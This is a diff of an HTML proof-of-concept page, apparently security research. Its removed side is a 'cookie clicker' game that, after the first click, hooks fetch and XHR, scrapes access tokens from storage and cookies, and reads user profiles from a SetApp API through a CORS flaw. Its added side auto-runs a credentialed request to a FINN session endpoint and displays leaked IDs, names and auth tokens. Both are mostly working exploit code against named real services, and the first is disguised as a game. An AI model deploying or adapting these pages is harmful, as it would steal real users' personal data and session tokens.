@@ -3,704 +3,214 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SetApp Cookie Clicker 🍪🔓</title>
+    <title>CORS Misconfiguration PoC - id.finn.no</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #0a1a2e 0%, #1a2b3d 50%, #2d3b4d 100%);
-            color: white;
+            font-family: 'Courier New', monospace;
+            background: #0a0e17;
+            color: #c9d1d9;
+            padding: 30px;
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
         }
-        /* Estrellas animadas */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: 
-                radial-gradient(2px 2px at 20% 30%, white, transparent),
-                radial-gradient(2px 2px at 60% 70%, white, transparent),
-                radial-gradient(1px 1px at 50% 50%, white, transparent),
-                radial-gradient(1px 1px at 80% 10%, white, transparent),
-                radial-gradient(2px 2px at 90% 60%, white, transparent);
-            background-size: 200px 200px;
-            animation: stars 50s linear infinite;
-            opacity: 0.5;
-        }
-        @keyframes stars {
-            from { background-position: 0 0; }
-            to { background-position: 0 200px; }
-        }
-        .container {
-            text-align: center;
-            z-index: 1;
-            background: rgba(255, 255, 255, 0.05);
-            padding: 40px;
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
-            max-width: 600px;
-        }
+        .container { max-width: 900px; margin: 0 auto; }
         h1 {
-            font-size: 3em;
-            margin-bottom: 10px;
-            text-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
-            animation: glow 2s ease-in-out infinite alternate;
-        }
-        @keyframes glow {
-            from { text-shadow: 0 0 20px rgba(255, 255, 255, 0.5); }
-            to { text-shadow: 0 0 30px rgba(255, 255, 255, 1), 0 0 40px #4CAF50; }
-        }
-        .subtitle {
-            font-size: 1.2em;
-            color: #4CAF50;
-            margin-bottom: 30px;
-        }
-        .score-display {
-            font-size: 4em;
-            font-weight: bold;
-            margin: 30px 0;
-            color: #FFD700;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
-        }
-        .cookie {
-            font-size: 10em;
-            cursor: pointer;
-            display: inline-block;
-            transition: transform 0.1s ease;
-            filter: drop-shadow(0 0 30px rgba(255, 215, 0, 0.6));
-            user-select: none;
-        }
-        .cookie:hover {
-            transform: scale(1.1);
-        }
-        .cookie:active {
-            transform: scale(0.9);
-        }
-        .stats {
-            margin-top: 30px;
-            font-size: 1.2em;
-            color: #4CAF50;
-        }
-        .message {
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(76, 175, 80, 0.1);
-            border: 1px solid rgba(76, 175, 80, 0.3);
-            border-radius: 10px;
-            font-size: 0.9em;
-            line-height: 1.6;
-        }
-        .click-effect {
-            position: fixed;
-            font-size: 2em;
-            font-weight: bold;
-            color: #FFD700;
-            pointer-events: none;
-            animation: float-up 1s ease-out forwards;
-            z-index: 1000;
-        }
-        @keyframes float-up {
-            0% {
-                opacity: 1;
-                transform: translateY(0);
-            }
-            100% {
-                opacity: 0;
-                transform: translateY(-100px);
-            }
-        }
-        .warning {
-            margin-top: 30px;
-            padding: 15px;
-            background: rgba(255, 100, 100, 0.1);
-            border: 2px solid rgba(255, 100, 100, 0.3);
-            border-radius: 10px;
-            font-size: 0.85em;
-            text-align: left;
-        }
-        .warning strong {
-            color: #ff6b6b;
-            display: block;
+            color: #ff4757;
+            font-size: 1.6em;
             margin-bottom: 5px;
         }
-        code {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 2px 6px;
-            border-radius: 3px;
-            color: #FFD700;
-            font-family: 'Courier New', monospace;
-        }
-        /* Modal personalizado */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 9999;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            overflow: auto;
-        }
-        .modal.show {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .modal-content {
-            background: linear-gradient(135deg, #1a2b3d 0%, #2d3b4d 100%);
-            padding: 30px;
-            border: 2px solid rgba(255, 100, 100, 0.5);
-            border-radius: 15px;
-            max-width: 800px;
-            max-height: 80vh;
-            overflow-y: auto;
-            box-shadow: 0 0 50px rgba(255, 100, 100, 0.3);
-        }
-        .modal-header {
-            font-size: 1.5em;
-            color: #ff6b6b;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        .modal-body {
-            font-family: 'Courier New', monospace;
+        .subtitle {
+            color: #666;
             font-size: 0.9em;
-            line-height: 1.8;
-            white-space: pre-wrap;
-            color: #fff;
+            margin-bottom: 25px;
         }
-        .modal-close {
-            background: #ff6b6b;
-            color: white;
-            border: none;
-            padding: 12px 30px;
+        .info-box {
+            background: #131a2b;
+            border: 1px solid #1e2d45;
             border-radius: 8px;
-            cursor: pointer;
+            padding: 18px;
+            margin-bottom: 20px;
+        }
+        .info-box h2 {
+            color: #58a6ff;
             font-size: 1em;
-            margin-top: 20px;
-            width: 100%;
+            margin-bottom: 10px;
+        }
+        .info-box p {
+            font-size: 0.85em;
+            line-height: 1.6;
+            color: #8b949e;
+        }
+        #status {
+            padding: 12px 18px;
+            border-radius: 6px;
+            font-size: 0.95em;
+            margin-bottom: 20px;
             font-weight: bold;
         }
-        .modal-close:hover {
-            background: #ff5252;
-        }
-        .token-input {
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.3);
+        .status-loading { background: #1c1f26; color: #f0c040; border: 1px solid #f0c04044; }
+        .status-success { background: #0d2818; color: #3fb950; border: 1px solid #3fb95044; }
+        .status-error { background: #2d1117; color: #ff4757; border: 1px solid #ff475744; }
+        .data-section {
+            background: #131a2b;
+            border: 1px solid #1e2d45;
             border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 20px;
         }
-        .token-input input {
-            width: 100%;
-            padding: 8px;
-            background: rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 5px;
-            color: white;
-            font-family: 'Courier New', monospace;
+        .data-section h3 {
+            background: #1a2332;
+            color: #58a6ff;
+            padding: 12px 18px;
             font-size: 0.9em;
-            margin-top: 5px;
+            border-bottom: 1px solid #1e2d45;
         }
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        .data-table tr:not(:last-child) { border-bottom: 1px solid #1e2d4566; }
+        .data-table td {
+            padding: 10px 18px;
+            font-size: 0.85em;
+            vertical-align: top;
+        }
+        .data-table td:first-child {
+            color: #ff4757;
+            font-weight: bold;
+            width: 160px;
+            white-space: nowrap;
+        }
+        .data-table td:last-child {
+            color: #3fb950;
+            word-break: break-all;
+        }
+        #raw-response {
+            background: #0d1117;
+            color: #c9d1d9;
+            padding: 18px;
+            font-size: 0.8em;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .btn {
+            background: #1a2332;
+            color: #58a6ff;
+            border: 1px solid #58a6ff44;
+            padding: 8px 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 0.85em;
+            margin-top: 10px;
+        }
+        .btn:hover { background: #58a6ff22; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🍪 SetApp Cookie Clicker 🔓</h1>
-        <p class="subtitle">Click to collect cookies!</p>
-        
-        <div class="score-display" id="score">0</div>
-        
-        <div class="cookie" id="cookie" onclick="clickCookie()">🍪</div>
-        
-        <div class="stats">
-            <div>Total clicks: <span id="clicks">0</span></div>
-            <div>Cookies per second: <span id="cps">0</span></div>
-        </div>
-        <div class="message">
-            👾 Click the cookie to earn points<br>
-            🎯 How many cookies can you collect?
-        </div>
-        
-        <div class="token-input" id="tokenSection" style="display: none;">
-            <label for="bearer-token"><strong>Bearer Token:</strong></label>
-            <input type="text" id="bearer-token" placeholder="Pega el token aquí">
-            <small style="display: block; margin-top: 5px; color: #aaa;">
-                Para obtenerlo: F12 → Application → Session Storage → https://my.setapp.com → busca "customer_access_token" → copia el valor
-            </small>
-            <button onclick="retryWithToken()" style="margin-top: 10px; padding: 8px 16px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer;">Intentar de nuevo</button>
-        </div>
-        
-        <div class="warning">
-            <strong>⚠️ Security Notice</strong>
-            This is a security research PoC. When you click, the game attempts to read
-            data from <code>user-api.setapp.com</code> to demonstrate a CORS vulnerability.
-        </div>
-    </div>
+        <h1>CORS Misconfiguration PoC</h1>
+        <p class="subtitle">Target: id.finn.no | Endpoint: /v2/session</p>
 
-    <!-- Modal personalizado -->
-    <div id="corsModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header" id="modalHeader"></div>
-            <div class="modal-body" id="modalBody"></div>
-            <button class="modal-close" onclick="closeModal()">Close</button>
+        <div class="info-box">
+            <h2>Description</h2>
+            <p>
+                The endpoint <strong>https://id.finn.no/v2/session</strong> reflects any arbitrary
+                <code>Origin</code> header in its <code>Access-Control-Allow-Origin</code> response header
+                while also setting <code>Access-Control-Allow-Credentials: true</code>.
+                This allows any malicious website to read authenticated user session data cross-origin.
+            </p>
+        </div>
+
+        <div id="status" class="status-loading">Sending cross-origin request with credentials...</div>
+
+        <div id="leaked-data" class="data-section hidden">
+            <h3>Leaked User Data</h3>
+            <table class="data-table">
+                <tbody id="data-body"></tbody>
+            </table>
+        </div>
+
+        <div class="data-section">
+            <h3>
+                Raw JSON Response
+                <button class="btn" onclick="copyRaw()" style="float:right;margin-top:-4px;">Copy</button>
+            </h3>
+            <div id="raw-response">Waiting for response...</div>
         </div>
     </div>
 
     <script>
-        // Game variables
-        let score = 0;
-        let clicks = 0;
-        let exploitExecuted = false;
+        const TARGET_URL = 'https://id.finn.no/v2/session?client_sdrn=sdrn%3Aspid.no%3Aclient%3A5087dc1b421c7a0b79000000&redirect_uri=https%3A%2F%2Fwww.finn.no%2F&sdk_version=6.2.7';
 
-        // Main click function
-        function clickCookie() {
-            score++;
-            clicks++;
-            
-            // Update display
-            document.getElementById('score').textContent = score;
-            document.getElementById('clicks').textContent = clicks;
-            
-            // Visual effect
-            showClickEffect(event);
-            
-            // Execute exploit on first click
-            if (!exploitExecuted) {
-                exploitExecuted = true;
-                setTimeout(executeCORSExploit, 2000); // 2 seconds after first click
-            }
-        }
+        const FIELDS = [
+            { key: 'userId',    label: 'User ID' },
+            { key: 'uuid',      label: 'UUID' },
+            { key: 'displayName', label: 'Display Name' },
+            { key: 'givenName', label: 'Given Name' },
+            { key: 'familyName', label: 'Family Name' },
+            { key: 'gender',    label: 'Gender' },
+            { key: 'photo',     label: 'Photo URL' },
+            { key: 'sp_id',     label: 'SP ID (Auth Token)' },
+            { key: 'merchantId', label: 'Merchant ID' },
+            { key: 'pairId',   label: 'Pair ID' },
+            { key: 'sdrn',     label: 'SDRN' },
+            { key: 'sig',      label: 'Signature Token' },
+            { key: 'expiresIn', label: 'Expires In (s)' },
+        ];
 
-        // Visual click effect
-        function showClickEffect(event) {
-            const effect = document.createElement('div');
-            effect.className = 'click-effect';
-            effect.textContent = '+1';
-            effect.style.left = event.clientX + 'px';
-            effect.style.top = event.clientY + 'px';
-            document.body.appendChild(effect);
-            
-            setTimeout(() => effect.remove(), 1000);
-        }
+        async function exploit() {
+            const statusEl = document.getElementById('status');
+            const rawEl = document.getElementById('raw-response');
+            const dataSection = document.getElementById('leaked-data');
+            const dataBody = document.getElementById('data-body');
 
-        // ========================================
-        // CORS EXPLOIT - Proof of Concept
-        // ========================================
-        
-        // Interceptar fetch para capturar tokens de peticiones a setapp.com
-        let capturedToken = null;
-        const originalFetch = window.fetch;
-        window.fetch = function(...args) {
-            const url = args[0];
-            const options = args[1] || {};
-            
-            // Si es una petición a setapp.com, capturar el token
-            if (typeof url === 'string' && url.includes('setapp.com')) {
-                const authHeader = options.headers && (
-                    options.headers['Authorization'] || 
-                    options.headers['authorization'] ||
-                    (options.headers.get && options.headers.get('Authorization'))
-                );
-                if (authHeader && authHeader.startsWith('Bearer ')) {
-                    capturedToken = authHeader.replace('Bearer ', '').trim();
-                    console.log('[CORS PoC] Captured token from fetch:', capturedToken);
-                }
-            }
-            
-            return originalFetch.apply(this, args);
-        };
-        
-        // Interceptar XMLHttpRequest también
-        const originalXHROpen = XMLHttpRequest.prototype.open;
-        const originalXHRSend = XMLHttpRequest.prototype.send;
-        XMLHttpRequest.prototype.open = function(method, url, ...rest) {
-            this._url = url;
-            return originalXHROpen.apply(this, [method, url, ...rest]);
-        };
-        XMLHttpRequest.prototype.send = function(...args) {
-            if (this._url && this._url.includes('setapp.com')) {
-                const authHeader = this.getRequestHeader && this.getRequestHeader('Authorization');
-                if (authHeader && authHeader.startsWith('Bearer ')) {
-                    capturedToken = authHeader.replace('Bearer ', '').trim();
-                    console.log('[CORS PoC] Captured token from XHR:', capturedToken);
-                }
-            }
-            return originalXHRSend.apply(this, args);
-        };
-        
-        function executeCORSExploit() {
-            console.log('[CORS PoC] Executing exploit...');
-            
-            // Buscar token
-            let token = capturedToken || getTokenFromStorage();
-            console.log('[CORS PoC] Token found:', token ? 'YES (' + token.substring(0, 20) + '...)' : 'NO');
-            
-            if (token) {
-                makeRequest(token);
-            } else {
-                console.log('[CORS PoC] No token found, trying with credentials only...');
-                tryWithCredentialsOnly();
-            }
-        }
-        
-        function makeRequest(token) {
-            const targetEndpoint = 'https://user-api.setapp.com/v1/me';
-            console.log('[CORS PoC] 🚀 Making request with customer_access_token:', token.substring(0, 20) + '...');
-            
-            // Intentar SIN credentials primero (porque * no funciona con credentials)
-            fetch(targetEndpoint, {
-                method: 'GET',
-                mode: 'cors',
-                headers: {
-                    'Accept': 'application/json',
-                    'Authorization': `Bearer ${token}`
-                }
-            })
-            .then(response => {
-                console.log('[CORS PoC] ✅ Response status:', response.status);
-                console.log('[CORS PoC] ✅ CORS Header:', response.headers.get('access-control-allow-origin'));
-                return response.json();
-            })
-            .then(data => {
-                console.log('[CORS PoC] ✅✅✅ SUCCESS! Got data:', data);
-                handleCORSResponse(data);
-            })
-            .catch((err) => {
-                console.log('[CORS PoC] ❌ Failed without credentials, trying with credentials:', err);
-                // Si falla, intentar con credentials
-                fetch(targetEndpoint, {
+            try {
+                const response = await fetch(TARGET_URL, {
                     method: 'GET',
-                    mode: 'cors',
-                    credentials: 'include',
-                    headers: {
-                        'Accept': 'application/json',
-                        'Authorization': `Bearer ${token}`
-                    }
-                })
-                .then(response => response.json())
-                .then(data => handleCORSResponse(data))
-                .catch(err2 => {
-                    console.error('[CORS PoC] ❌❌❌ Both attempts failed:', err2);
-                    handleCORSResponse({
-                        error: err2.message || 'Network error',
-                        needToken: true
-                    });
+                    credentials: 'include'
                 });
-            });
-        }
-        
-        function tryWithCredentialsOnly() {
-            const targetEndpoint = 'https://user-api.setapp.com/v1/me';
-            console.log('[CORS PoC] Trying without token (credentials only)...');
-            
-            // Intentar sin credentials primero (porque * no funciona con credentials)
-            fetch(targetEndpoint, {
-                method: 'GET',
-                mode: 'cors',
-                headers: {
-                    'Accept': 'application/json'
-                }
-            })
-            .then(response => {
-                console.log('[CORS PoC] Status:', response.status);
-                console.log('[CORS PoC] CORS Header:', response.headers.get('access-control-allow-origin'));
-                return response.json();
-            })
-            .then(data => {
-                handleCORSResponse(data);
-            })
-            .catch(error => {
-                console.error('[CORS PoC] Error:', error);
-                handleCORSResponse({
-                    error: 'No se encontró customer_access_token. Abre F12 → Application → Session Storage → https://my.setapp.com → busca "customer_access_token" y pégala aquí.',
-                    needToken: true
-                });
-            });
-        }
-        
-        function getTokenFromStorage() {
-            console.log('[CORS PoC] 🔍 Searching for customer_access_token...');
-            
-            // 1. Buscar customer_access_token en sessionStorage PRIMERO (más común)
-            try {
-                const token = sessionStorage.getItem('customer_access_token');
-                if (token && token.length > 10) {
-                    console.log('[CORS PoC] ✅✅✅ FOUND customer_access_token in sessionStorage!');
-                    return token;
-                }
-                console.log('[CORS PoC] customer_access_token not in sessionStorage');
-            } catch(e) {
-                console.log('[CORS PoC] ⚠️ Cannot access sessionStorage (cross-origin):', e.message);
-            }
-            
-            // 2. Buscar en localStorage
-            try {
-                const token = localStorage.getItem('customer_access_token');
-                if (token && token.length > 10) {
-                    console.log('[CORS PoC] ✅✅✅ FOUND customer_access_token in localStorage!');
-                    return token;
-                }
-            } catch(e) {
-                console.log('[CORS PoC] Cannot access localStorage:', e.message);
-            }
-            
-            // 3. Buscar en cookies (customer_access_token o custome)
-            try {
-                const allCookies = document.cookie;
-                console.log('[CORS PoC] All cookies:', allCookies || 'No cookies');
-                
-                if (allCookies) {
-                    const cookies = allCookies.split(';');
-                    for (let cookie of cookies) {
-                        const parts = cookie.trim().split('=');
-                        if (parts.length >= 2) {
-                            const name = parts[0].trim();
-                            const value = parts.slice(1).join('=');
-                            
-                            // Buscar customer_access_token específicamente
-                            if (name === 'customer_access_token') {
-                                if (value && value.length > 10) {
-                                    console.log('[CORS PoC] ✅✅✅ FOUND customer_access_token in cookie!');
-                                    return value;
-                                }
-                            }
-                            
-                            // Buscar custome como fallback
-                            if (name === 'custome' && value && value.length > 20) {
-                                console.log('[CORS PoC] ✅ Found custome in cookie');
-                                return value;
-                            }
+
+                const data = await response.json();
+                rawEl.textContent = JSON.stringify(data, null, 2);
+
+                if (response.ok && data.result === true) {
+                    statusEl.className = 'status-success';
+                    statusEl.textContent = 'SUCCESS - User session data leaked from ' + window.location.origin;
+
+                    dataSection.classList.remove('hidden');
+                    FIELDS.forEach(function(f) {
+                        if (data[f.key] !== undefined && data[f.key] !== '') {
+                            const tr = document.createElement('tr');
+                            const tdLabel = document.createElement('td');
+                            const tdValue = document.createElement('td');
+                            tdLabel.textContent = f.label;
+                            tdValue.textContent = String(data[f.key]);
+                            tr.appendChild(tdLabel);
+                            tr.appendChild(tdValue);
+                            dataBody.appendChild(tr);
                         }
-                    }
-                }
-            } catch(e) {
-                console.log('[CORS PoC] Error reading cookies:', e);
-            }
-            
-            console.log('[CORS PoC] ❌❌❌ customer_access_token NOT FOUND');
-            return null;
-        }
-
-
-        function handleCORSResponse(data) {
-            if (data.needToken) {
-                document.getElementById('tokenSection').style.display = 'block';
-                showDemoAlert(data);
-                return;
-            }
-            
-            // Check for authorization errors
-            if (data.errors && data.errors.length > 0) {
-                const authError = data.errors.find(e => 
-                    e.title && (e.title.toLowerCase().includes('authorization') || 
-                               e.title.toLowerCase().includes('session') ||
-                               e.detail && e.detail.toLowerCase().includes('expired'))
-                );
-                if (authError) {
-                    document.getElementById('tokenSection').style.display = 'block';
-                    showDemoAlert({
-                        ...data,
-                        needToken: true,
-                        message: 'Token expirado o inválido. Pega el nuevo customer_access_token aquí:'
                     });
-                    return;
+                } else {
+                    statusEl.className = 'status-error';
+                    statusEl.textContent = 'HTTP ' + response.status + ' - ' + (data.error ? data.error.description : 'Request failed');
                 }
-            }
-            
-            if (data.data && (data.data.email || data.data.id || data.data.public_id)) {
-                showSuccessAlert(data);
-            } else {
-                showDemoAlert(data);
+            } catch (err) {
+                statusEl.className = 'status-error';
+                statusEl.textContent = 'Error: ' + err.message;
+                rawEl.textContent = err.toString();
             }
         }
-        
-        function retryWithToken() {
-            const token = document.getElementById('bearer-token').value.trim();
-            if (!token) return;
-            
-            fetch('https://user-api.setapp.com/v1/me', {
-                method: 'GET',
-                mode: 'cors',
-                headers: {
-                    'Accept': 'application/json',
-                    'Authorization': `Bearer ${token}`
-                }
-            })
-            .then(response => response.json())
-            .then(data => handleCORSResponse(data))
-            .catch(error => {
-                handleCORSResponse({ error: error.message, needToken: true });
-            });
+
+        function copyRaw() {
+            const text = document.getElementById('raw-response').textContent;
+            navigator.clipboard.writeText(text);
         }
 
-        function showDemoAlert(errorData) {
-            const message = `Endpoint: https://user-api.setapp.com/v1/me
-
-Response received:
-${JSON.stringify(errorData, null, 2)}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ CRITICAL SECURITY ISSUE:
-
-Even though this endpoint requires authentication, I can read the COMPLETE response
-due to the CORS misconfiguration on user-api.setapp.com.
-
-The server responds with:
-access-control-allow-origin: *
-
-This means ANY website can read the response, including:
-- Error messages
-- User data (if authenticated)
-- API structure
-- Any sensitive information
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-If you were an authenticated user, instead of this error,
-I would see and steal:
-
-* Email address
-* Public ID (UUID)
-* Internal User ID
-* Display name
-* Email confirmation status
-* Payment provider information
-* Account currency
-* Registration date
-* AI credits information
-* Account permissions
-* And all other user profile data
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-In a real attack:
-1. You visit a malicious website
-2. The site makes a CORS request to user-api.setapp.com/v1/me
-3. Your browser sends your authentication token (from cookies/storage)
-4. The server responds with access-control-allow-origin: *
-5. The malicious site reads ALL your data
-6. Data is sent to attacker's server
-7. You see NOTHING - the game continues normally
-
-This is only shown for demonstration purposes.
-In a real attack, there would be no notification.`;
-            
-            showModal('🔴 CORS VULNERABILITY DEMONSTRATION', message);
-        }
-
-        function showSuccessAlert(data) {
-            // Extract sensitive information
-            const userData = data.data;
-            const sensitiveData = {
-                id: userData.id,
-                public_id: userData.public_id,
-                email: userData.email,
-                name: userData.name,
-                email_confirmed: userData.email_confirmed,
-                type: userData.type,
-                locale: userData.locale,
-                payment_provider: userData.payment_provider,
-                account_currency: userData.account_currency,
-                registration_date: userData.registration_date,
-                payment_info_required: userData.payment_info_required,
-                desktop_cc_required: userData.desktop_cc_required,
-                trial_period_length: userData.trial_period_length,
-                marketing_subscribed: userData.marketing_subscribed,
-                password_created: userData.password_created,
-                is_team_member: userData.is_team_member,
-                is_referral: userData.is_referral,
-                has_price_features: userData.has_price_features,
-                ai_credits: userData.ai_credits,
-                permissions: userData.permissions,
-                full_response: data
-            };
-
-            const registrationDate = userData.registration_date ? 
-                new Date(userData.registration_date * 1000).toLocaleString() : 'N/A';
-
-            const message = `You are logged in to SetApp!
-
-I can read your complete user data:
-
-${JSON.stringify(sensitiveData, null, 2)}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ In a real attack, this data would be:
-
-1. Sent to an attacker's server immediately
-2. Completely silent (no notification)
-3. Stolen while you play the game
-4. You would never know it was stolen
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Sensitive information exposed:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-📧 Email: ${userData.email || 'N/A'}
-🆔 Public ID: ${userData.public_id || 'N/A'}
-🔢 Internal ID: ${userData.id || 'N/A'}
-👤 Name: ${userData.name || 'N/A'}
-✅ Email Confirmed: ${userData.email_confirmed ? 'Yes' : 'No'}
-💳 Payment Provider: ${userData.payment_provider || 'N/A'}
-💰 Account Currency: ${userData.account_currency || 'N/A'}
-📅 Registration Date: ${registrationDate}
-🔐 Payment Info Required: ${userData.payment_info_required ? 'Yes' : 'No'}
-🎫 Trial Period: ${userData.trial_period_length || 0} days
-👥 Team Member: ${userData.is_team_member ? 'Yes' : 'No'}
-🎁 Referral: ${userData.is_referral ? 'Yes' : 'No'}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-This demonstrates the full impact of the CORS vulnerability.
-
-The server responds with:
-access-control-allow-origin: *
-
-This allows ANY website to read your sensitive data.`;
-            
-            showModal('🎯 USER DATA EXPOSED!', message);
-        }
-
-        function showModal(title, content) {
-            document.getElementById('modalHeader').textContent = title;
-            document.getElementById('modalBody').textContent = content;
-            document.getElementById('corsModal').classList.add('show');
-        }
-
-        function closeModal() {
-            document.getElementById('corsModal').classList.remove('show');
-        }
-
-        // Auto-load saved data
-        window.onload = function() {
-            const saved = localStorage.getItem('setappCookies');
-            if (saved) {
-                score = parseInt(saved);
-                document.getElementById('score').textContent = score;
-            }
-        };
-
-        // Auto-save
-        setInterval(() => {
-            localStorage.setItem('setappCookies', score);
-        }, 5000);
-
-        console.log('🍪 SetApp Cookie Clicker loaded');
-        console.log('👾 Click to start playing');
-        console.log('⚠️  CORS exploit will execute after first click');
-        console.log('🎯 Target: https://user-api.setapp.com/v1/me');
+        exploit();
     </script>
 </body>
 </html>
